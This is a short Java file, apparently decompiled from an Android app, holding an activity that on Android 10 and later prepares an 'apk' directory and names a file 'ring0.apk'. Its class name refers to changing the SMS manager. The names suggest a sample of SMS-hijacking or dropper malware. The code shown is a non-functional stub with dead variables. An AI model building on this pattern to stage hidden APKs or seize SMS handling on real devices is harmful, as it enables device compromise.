package com.example.mmm.Activity;

import android.app.Activity;
import android.os.Bundle;
import android.os.Build.VERSION;
import com.example.mmm.Utils.utils;

public class activity_change_sms_manager_sdk_Q extends Activity {
   protected void onCreate(Bundle var1) {
      super.onCreate(var1);
      if (VERSION.SDK_INT >= 29) {
         new utils();
         Object var10001 = null;
         this.getDir("apk", 0);
         String var10003 = "ring0.apk";
         boolean var10000 = false;
      } else {
         this.finish();
      }
   }
}
